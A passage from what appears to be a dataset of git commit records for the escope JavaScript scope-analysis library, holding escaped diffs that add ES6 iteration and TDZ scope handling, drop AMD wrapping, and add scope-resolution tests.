Check this is direct call to eval<\n>-                    if (!options.ignoreEval && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>-                        // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>-                        // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>-                        currentScope.variableScope.__detectEval();<\n>-                    }<\n>-                    break;<\n>-                case Syntax.CatchClause:<\n>-                    scopeManager.__nestScope(node<c> parent);<\n>-                    traverseIdentifierInPattern(node.param<c> function (pattern) {<\n>-                        currentScope.__define(pattern<c> {<\n>-                            type: Variable.CatchClause<c><\n>-                            name: node.param<c><\n>-                            node: node<\n>-                        });<\n>-                    });<\n>-                    break;<\n>-                case Syntax.ClassDeclaration:<\n>-                    // Outer block scope.<\n>-                    currentScope.__define(node.id<c> {<\n>-                        type: Variable.ClassName<c><\n>-                        name: node.id<c><\n>-                        node: node<\n>-                    });<\n>-                    currentScope.__referencing(node.superClass);<\n>-                    break;<\n>-                case Syntax.ClassBody:<\n>-                    // ClassBody scope.<\n>-                    scopeManager.__nestScope(node<c> parent);<\n>-                    if (parent && parent.id) {<\n>-                        currentScope.__define(parent.id<c> {<\n>-                            type: Variable.ClassName<c><\n>-                            name: node.id<c><\n>-                            node: node<\n>-                        });<\n>-                    break;<\n>-                case Syntax.ClassExpression:<\n>-                    currentScope.__referencing(node.superClass);<\n>-                    break;<\n>-                case Syntax.ConditionalExpression:<\n>-                    currentScope.__referencing(node.test);<\n>-                    currentScope.__referencing(node.consequent);<\n>-                    currentScope.__referencing(node.alternate);<\n>-                    break;<\n>-                case Syntax.ContinueStatement:<\n>-                    break;<\n>-                case Syntax.DirectiveStatement:<\n>-                    break;<\n>-                case Syntax.DoWhileStatement:<\n>-                    currentScope.__referencing(node.test);<\n>-                    break;<\n>-                case Syntax.DebuggerStatement:<\n>-                    break;<\n>-                case Syntax.EmptyStatement:<\n>-                    break;<\n>-                case Syntax.ExpressionStatement:<\n>-                    currentScope.__referencing(node.expression);<\n>-                    break;<\n>-                case Syntax.ForStatement:<\n>-                    if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>-                        // Create ForStatement declaration.<\n>-                        // NOTE: In ES6<c> ForStatement dynamically generates<\n>-                        // per iteration environment. However<c> escope is<\n>-                        // a static analyzer<c> we only generate one scope for ForStatement.<\n>-                        scopeManager.__nestScope(node<c> parent);<\n>-                    }<\n>-                    currentScope.__referencing(node.init);<\n>-                    currentScope.__referencing(node.test);<\n>-                    currentScope.__referencing(node.update);<\n>-                    break;<\n>-                case Syntax.ForOfStatement:<\n>-                case Syntax.ForInStatement:<\n>-                    if (node.left.type === Syntax.VariableDeclaration) {<\n>-                        if (node.left.kind !== 'var') {<\n>-                            // LetOrConst Declarations are specially handled.<\n>-                            break;<\n>-                        }<\n>-                        traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                        });<\n>-                    } else {<\n>-                        traverseIdentifierInPattern(node.left<c> function (pattern) {<\n>-                            var maybeImplicitGlobal = null;<\n>-                            if (!currentScope.isStrict) {<\n>-                                maybeImplicitGlobal = {<\n>-                                    pattern: pattern<c><\n>-                                    node: node<\n>-                                };<\n>-                            }<\n>-                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-                        });<\n>-                    }<\n>-                    currentScope.__referencing(node.right);<\n>-                    break;<\n>-                case Syntax.FunctionDeclaration:<\n>-                    // FunctionDeclaration name is defined in upper scope<\n>-                    // NOTE: Not referring variableScope. It is intended.<\n>-                    // Since<\n>-                    //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>-                    //  in ES6<c> FunctionDeclaration should be block scoped.<\n>-                    currentScope.__define(node.id<c> {<\n>-                        type: Variable.FunctionName<c><\n>-                        name: node.id<c><\n>-                        node: node<\n>-                    });<\n>-                    // falls through<\n>-                case Syntax.FunctionExpression:<\n>-                case Syntax.ArrowFunctionExpression:<\n>-                    // id is defined in upper scope<\n>-                    scopeManager.__nestScope(node<c> parent);<\n>-                    for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>-                        traverseIdentifierInPattern(node.params[i]<c> function (pattern) {<\n>-                            currentScope.__define(pattern<c> {<\n>-                                type: Variable.Parameter<c><\n>-                                name: pattern<c><\n>-                                node: node<c><\n>-                                index: i<\n>-                            });<\n>-                        });<\n>-                    }<\n>-                    break;<\n>-                case Syntax.Identifier:<\n>-                    break;<\n>-                case Syntax.IfStatement:<\n>-                    currentScope.__referencing(node.test);<\n>-                    break;<\n>-                case Syntax.Literal:<\n>-                    break;<\n>-                case Syntax.LabeledStatement:<\n>-                    break;<\n>-                case Syntax.LogicalExpression:<\n>-                    currentScope.__referencing(node.left);<\n>-                    currentScope.__referencing(node.right);<\n>-                    break;<\n>-                case Syntax.MemberExpression:<\n>-                    currentScope.__referencing(node.object);<\n>-                    if (node.computed) {<\n>-                        currentScope.__referencing(node.property);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.NewExpression:<\n>-                    currentScope.__referencing(node.callee);<\n>-                    for (i = 0<c> iz = node['arguments'].length; i < iz; ++i) {<\n>-                        currentScope.__referencing(node['arguments'][i]);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.ObjectExpression:<\n>-                    break;<\n>-                case Syntax.Program:<\n>-                    scopeManager.__nestScope(node<c> parent);<\n>-                    break;<\n>-                case Syntax.Property:<\n>-                    // Don't referencing variables when the parent type is ObjectPattern.<\n>-                    if (parent.type !== Syntax.ObjectExpression) {<\n>-                        break;<\n>-                    }<\n>-                    if (node.computed) {<\n>-                        currentScope.__referencing(node.key);<\n>-                    }<\n>-                    if (node.kind === 'init') {<\n>-                        currentScope.__referencing(node.value);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.MethodDefinition:<\n>-                    if (node.computed) {<\n>-                        currentScope.__referencing(node.key);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.ReturnStatement:<\n>-                    currentScope.__referencing(node.argument);<\n>-                    break;<\n>-                case Syntax.SequenceExpression:<\n>-                    for (i = 0<c> iz = node.expressions.length; i < iz; ++i) {<\n>-                        currentScope.__referencing(node.expressions[i]);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.SwitchStatement:<\n>-                    currentScope.__referencing(node.discriminant);<\n>-                    break;<\n>-                case Syntax.SwitchCase:<\n>-                    currentScope.__referencing(node.test);<\n>-                    break;<\n>-                case Syntax.TaggedTemplateExpression:<\n>-                    currentScope.__referencing(node.tag);<\n>-                    break;<\n>-                case Syntax.TemplateLiteral:<\n>-                    for (i = 0<c> iz = node.expressions.length; i < iz; ++i) {<\n>-                        currentScope.__referencing(node.expressions[i]);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.ThisExpression:<\n>-                    currentScope.variableScope.__detectThis();<\n>-                    break;<\n>-                case Syntax.ThrowStatement:<\n>-                    currentScope.__referencing(node.argument);<\n>-                    break;<\n>-                case Syntax.TryStatement:<\n>-                    break;<\n>-                case Syntax.UnaryExpression:<\n>-                    currentScope.__referencing(node.argument);<\n>-                    break;<\n>-                case Syntax.UpdateExpression:<\n>-                    currentScope.__referencing(node.argument<c> Reference.RW<c> null);<\n>-                    break;<\n>-                case Syntax.VariableDeclaration:<\n>-                    if (node.kind !== 'var' && parent) {<\n>-                        if (parent.type === Syntax.ForInStatement || parent.type === Syntax.ForOfStatement) {<\n>-                            // e.g.<\n>-                            //    for (let i in abc);<\n>-                            // In this case<c> they are specially handled in ForIn/ForOf statements.<\n>-                            break;<\n>-                        }<\n>-                    }<\n>-                    variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>-                    for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>-                        decl = node.declarations[i];<\n>-                        doVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>-                        if (decl.init) {<\n>-                            currentScope.__referencing(decl.init);<\n>-                        }<\n>-                    }<\n>-                    break;<\n>-                case Syntax.VariableDeclarator:<\n>-                    break;<\n>-                case Syntax.WhileStatement:<\n>-                    currentScope.__referencing(node.test);<\n>-                    break;<\n>-                case Syntax.WithStatement:<\n>-                    currentScope.__referencing(node.object);<\n>-                    // Then nest scope for WithStatement.<\n>-                    scopeManager.__nestScope(node<c> parent);<\n>-                    break;<\n>-                }<\n>-            }<c><\n>-            leave: function leave(node) {<\n>-                while (currentScope && node === currentScope.block) {<\n>-                    currentScope.__close();<\n>-                }<\n>-            }<\n>-        });<\n>-    ""estraverse"": "">=1.8.0""<\n>-        expect(scope.block.type).to.be.equal 'ClassBody'<\n>-        expect(scope.block.type).to.be.equal 'ClassBody'<\n>-        expect(scope.block.type).to.be.equal 'ClassBody'<\n>-        expect(scope.block.type).to.be.equal 'ClassBody'<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>-        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'console'<\n>-        expect(scope.references[1].resolved).to.be.equal null<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>-        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'console'<\n>-        expect(scope.references[1].resolved).to.be.equal null<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>-        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'j'<\n>-        expect(scope.references[1].resolved).to.be.equal iterScope.variables[1]<\n>-        expect(scope.references[2].identifier.name).to.be.equal 'k'<\n>-        expect(scope.references[2].resolved).to.be.equal iterScope.variables[2]<\n>-        expect(scope.references[3].identifier.name).to.be.equal 'console'<\n>-        expect(scope.references[3].resolved).to.be.null<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,22,25,2 Dec 2014,Drop MethodDefinition check,0,0,1,2,184,+            if (block.type === Syntax.FunctionExpression && block.id) {<\n>,-            if (block.type === Syntax.FunctionExpression && block.id && !isMethodDefinition(block<c> parent)) {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Tue,21,7,2 Dec 2014,Drop AMD style,0,0,1,30,1082,+(function () {<\n>+        estraverse<c><\n>+    estraverse = require('estraverse');<\n>,-/*global exports:true<c> define:true<c> require:true*/<\n>-(function (factory<c> global) {<\n>-    'use strict';<\n>-    function namespace(str<c> obj) {<\n>-        var i<c> iz<c> names<c> name;<\n>-        names = str.split('.');<\n>-        for (i = 0<c> iz = names.length; i < iz; ++i) {<\n>-            name = names[i];<\n>-            if (obj.hasOwnProperty(name)) {<\n>-                obj = obj[name];<\n>-            } else {<\n>-                obj = (obj[name] = {});<\n>-            }<\n>-        }<\n>-        return obj;<\n>-    }<\n>-    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>-    // and plain browser loading<c><\n>-    if (typeof define === 'function' && define.amd) {<\n>-        define('escope'<c> ['exports'<c> 'estraverse']<c> function (exports<c> estraverse) {<\n>-            factory(exports<c> global<c> estraverse);<\n>-        });<\n>-    } else if (typeof exports !== 'undefined') {<\n>-        factory(exports<c> global<c> require('estraverse'));<\n>-    } else {<\n>-        factory(namespace('escope'<c> global)<c> global<c> global.estraverse);<\n>-    }<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,8,52,24 Nov 2014,Add For iteration scope ref #33,0,0,2,71,4370,"+            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement || block.type === Syntax.ForStatement) ? 'for' :<\n>+                    if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>+                        // Create ForStatement declaration.<\n>+                        // NOTE: In ES6<c> ForStatement dynamically generates<\n>+                        // per iteration environment. However<c> escope is<\n>+                        // a static analyzer<c> we only generate one scope for ForStatement.<\n>+                        scopeManager.__nestScope(node<c> parent);<\n>+                    }<\n>+    it 'let materialize iteration scope for ForStatement#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            let i = 20;<\n>+            let obj = {};<\n>+            for (let { i<c> j<c> k } = obj; i < okok; ++i) {<\n>+                console.log(i<c> j<c> k);<\n>+            }<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        functionScope = scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        expect(scope.variables[2].name).to.be.equal 'obj'<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'obj'<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>+        iterScope = scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'for'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'Variable'<\n>+        expect(scope.variables[1].name).to.be.equal 'j'<\n>+        expect(scope.variables[1].defs[0].type).to.be.equal 'Variable'<\n>+        expect(scope.variables[2].name).to.be.equal 'k'<\n>+        expect(scope.variables[2].defs[0].type).to.be.equal 'Variable'<\n>+        expect(scope.references).to.have.length 7<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'j'<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'k'<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[2]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'obj'<\n>+        expect(scope.references[3].resolved).to.be.equal functionScope.variables[2]<\n>+        expect(scope.references[4].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[4].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[5].identifier.name).to.be.equal 'okok'<\n>+        expect(scope.references[5].resolved).to.be.null<\n>+        expect(scope.references[6].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[6].resolved).to.be.equal scope.variables[0]<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 4<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'j'<\n>+        expect(scope.references[1].resolved).to.be.equal iterScope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'k'<\n>+        expect(scope.references[2].resolved).to.be.equal iterScope.variables[2]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[3].resolved).to.be.null<\n>",-            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement) ? 'for' :<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,8,36,24 Nov 2014,Add tests for multiple names in ForIn decl case ref #33,0,0,1,57,3113,"+    it 'let materialize iteration scope for ForInStatement#1'<c> -><\n>+    it 'let materialize iteration scope for ForInStatement#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            let i = 20;<\n>+            for (let { i<c> j<c> k } in i) {<\n>+                console.log(i);<\n>+            }<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 5<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        iterScope = scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'TDZ'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'TDZ'<\n>+        expect(scope.variables[1].name).to.be.equal 'j'<\n>+        expect(scope.variables[1].defs[0].type).to.be.equal 'TDZ'<\n>+        expect(scope.variables[2].name).to.be.equal 'k'<\n>+        expect(scope.variables[2].defs[0].type).to.be.equal 'TDZ'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        iterScope = scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'for'<\n>+        expect(scope.variables).to.have.length 3<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[1].name).to.be.equal 'j'<\n>+        expect(scope.variables[2].name).to.be.equal 'k'<\n>+        expect(scope.references).to.have.length 3<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'j'<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'k'<\n>+        expect(scope.references[2].resolved).to.be.equal scope.variables[2]<\n>+        scope = scopeManager.scopes[4]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[1].resolved).to.be.equal null<\n>",-    it 'let materialize iteration scope for ForInStatement'<c> -><\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,8,33,24 Nov 2014,Support TDZ scope ref #33 http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation,0,0,2,72,4350,+    Variable.TDZ = 'TDZ';<\n>+    /* Special Scope types. */<\n>+    var SCOPE_NORMAL = 0<c><\n>+        SCOPE_FUNCTION_EXPRESSION_NAME = 1<c><\n>+        SCOPE_TDZ = 2;<\n>+    function Scope(scopeManager<c> block<c> parent<c> scopeType) {<\n>+            (scopeType === SCOPE_TDZ) ? 'TDZ' :<\n>+        if (scopeType === SCOPE_FUNCTION_EXPRESSION_NAME) {<\n>+                scopeManager.__nestFunctionExpressionNameScope(block<c> parent);<\n>+        return new Scope(this<c> node<c> parent<c> SCOPE_NORMAL);<\n>+    };<\n>+    ScopeManager.prototype.__nestTDZScope = function (node<c> iterationNode) {<\n>+        return new Scope(this<c> node<c> iterationNode<c> SCOPE_TDZ);<\n>+    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> parent) {<\n>+        return new Scope(this<c> node<c> parent<c> SCOPE_FUNCTION_EXPRESSION_NAME);<\n>+    function doVariableDeclaration(variableTargetScope<c> type<c> node<c> index) {<\n>+                type: type<c><\n>+    function materializeTDZScope(scopeManager<c> node<c> iterationNode) {<\n>+        // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>+        // TDZ scope hides the declaration's names.<\n>+        scopeManager.__nestTDZScope(node<c> iterationNode);<\n>+        doVariableDeclaration(currentScope<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>+        currentScope.__referencing(node);<\n>+    }<\n>+        doVariableDeclaration(currentScope<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>+                    // Construct TDZ scope.<\n>+                    if (parent.right === node) {<\n>+                        materializeTDZScope(scopeManager<c> node<c> parent);<\n>+                    }<\n>+                    if (parent.body === node) {<\n>+                        materializeIterationScope(scopeManager<c> parent);<\n>+                    }<\n>+                        if (node.left.kind !== 'var') {<\n>+                            // LetOrConst Declarations are specially handled.<\n>+                            break;<\n>+                        traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                        });<\n>+                        doVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>+        expect(scopeManager.scopes).to.have.length 5<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.type).to.be.equal 'TDZ'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'TDZ'<\n>+        expect(scope.references).to.have.length 1<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[0]<\n>+        iterScope = scope = scopeManager.scopes[3]<\n>+        scope = scopeManager.scopes[4]<\n>,-    function Scope(scopeManager<c> block<c> parent<c> namingScopeForFunctionExpression) {<\n>-        if (namingScopeForFunctionExpression) {<\n>-                scopeManager.__createScopeForNaming(block<c> parent);<\n>-        return new Scope(this<c> node<c> parent<c> false);<\n>-    ScopeManager.prototype.__createScopeForNaming = function (node<c> parent) {<\n>-        return new Scope(this<c> node<c> parent<c> true);<\n>-    function doVariableDeclaration(variableTargetScope<c> node<c> index) {<\n>-                type: Variable.Variable<c><\n>-        doVariableDeclaration(currentScope<c> letOrConstDecl<c> 0);<\n>-                    parent.body === node &&<\n>-                    materializeIterationScope(scopeManager<c> parent);<\n>-                        // LetOrConst Declarations are handled in materializeIterationScope.<\n>-                        if (node.left.kind === 'var') {<\n>-                            traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>-                                currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                            });<\n>-                        doVariableDeclaration(variableTargetScope<c> node<c> i);<\n>-        expect(scopeManager.scopes).to.have.length 4<\n>-        expect(scope.references).to.have.length 2<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>-        expect(scope.references[1].resolved).to.be.equal scope.variables[1]<\n>-        scope = scopeManager.scopes[3]<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,8,4,24 Nov 2014,Support ES6 ForOf/ForIn iteration scopes ref #33,0,1,1,185,10378,"+    function Scope(scopeManager<c> block<c> parent<c> namingScopeForFunctionExpression) {<\n>+            (block.type === Syntax.BlockStatement) ? 'block' :<\n>+            (block.type === Syntax.FunctionExpression || block.type === Syntax.FunctionDeclaration || block.type === Syntax.ArrowFunctionExpression) ? 'function' :<\n>+            (block.type === Syntax.ForInStatement || block.type === Syntax.ForOfStatement) ? 'for' :<\n>+            (block.type === Syntax.ClassBody) ? 'class' : 'global';<\n>+        if (namingScopeForFunctionExpression) {<\n>+                scopeManager.__createScopeForNaming(block<c> parent);<\n>+        for (i = 0<c> iz = this.scopes.length; i < iz; ++i) {<\n>+            scope = this.scopes[i];<\n>+            if (!scope.functionExpressionScope) {<\n>+                if (scope.block === node) {<\n>+                    return scope;<\n>+    ScopeManager.prototype.__nestScope = function (node<c> parent) {<\n>+        return new Scope(this<c> node<c> parent<c> false);<\n>+    ScopeManager.prototype.__createScopeForNaming = function (node<c> parent) {<\n>+        return new Scope(this<c> node<c> parent<c> true);<\n>+    };<\n>+    ScopeManager.prototype.__isES6 = function () {<\n>+        return this.__options.ecmaVersion >= 6;<\n>+    function materializeIterationScope(scopeManager<c> node) {<\n>+        // Generate iteration scope for upper ForIn/ForOf Statements.<\n>+        // parent node for __nestScope is only necessary to<\n>+        // distinguish MethodDefinition.<\n>+        var letOrConstDecl;<\n>+        scopeManager.__nestScope(node<c> null);<\n>+        letOrConstDecl = node.left;<\n>+        doVariableDeclaration(currentScope<c> letOrConstDecl<c> 0);<\n>+        traverseIdentifierInPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>+            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+        });<\n>+    }<\n>+                // Special path for ForIn/ForOf Statement block scopes.<\n>+                if (parent &&<\n>+                    (parent.type === Syntax.ForInStatement || parent.type === Syntax.ForOfStatement) &&<\n>+                    parent.body === node &&<\n>+                    parent.left.type === Syntax.VariableDeclaration &&<\n>+                    parent.left.kind !== 'var') {<\n>+                    materializeIterationScope(scopeManager<c> parent);<\n>+                    if (scopeManager.__isES6()) {<\n>+                        if (!parent ||<\n>+                                parent.type !== Syntax.FunctionExpression &&<\n>+                                parent.type !== Syntax.FunctionDeclaration &&<\n>+                                parent.type !== Syntax.ArrowFunctionExpression) {<\n>+                            scopeManager.__nestScope(node<c> parent);<\n>+                        }<\n>+                    }<\n>+                    scopeManager.__nestScope(node<c> parent);<\n>+                    scopeManager.__nestScope(node<c> parent);<\n>+                        // LetOrConst Declarations are handled in materializeIterationScope.<\n>+                        if (node.left.kind === 'var') {<\n>+                            traverseIdentifierInPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                                currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                            });<\n>+                        }<\n>+                    currentScope.__define(node.id<c> {<\n>+                    scopeManager.__nestScope(node<c> parent);<\n>+                    scopeManager.__nestScope(node<c> parent);<\n>+                    if (node.kind !== 'var' && parent) {<\n>+                        if (parent.type === Syntax.ForInStatement || parent.type === Syntax.ForOfStatement) {<\n>+                            // e.g.<\n>+                            //    for (let i in abc);<\n>+                            // In this case<c> they are specially handled in ForIn/ForOf statements.<\n>+                            break;<\n>+                        }<\n>+                    }<\n>+                    currentScope.__referencing(node.object);<\n>+                    // Then nest scope for WithStatement.<\n>+                    scopeManager.__nestScope(node<c> parent);<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'ES6 iteration scope'<c> -><\n>+    it 'let materialize iteration scope for ForInStatement'<c> -><\n>+        ast = harmony.parse """"""<\n>+        (function () {<\n>+            let i = 20;<\n>+            for (let i in i) {<\n>+                console.log(i);<\n>+            }<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 4<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>+        expect(scope.variables[1].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 2<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[1].resolved).to.be.equal scope.variables[1]<\n>+        iterScope = scope = scopeManager.scopes[2]<\n>+        expect(scope.type).to.be.equal 'for'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'i'<\n>+        expect(scope.references).to.have.length 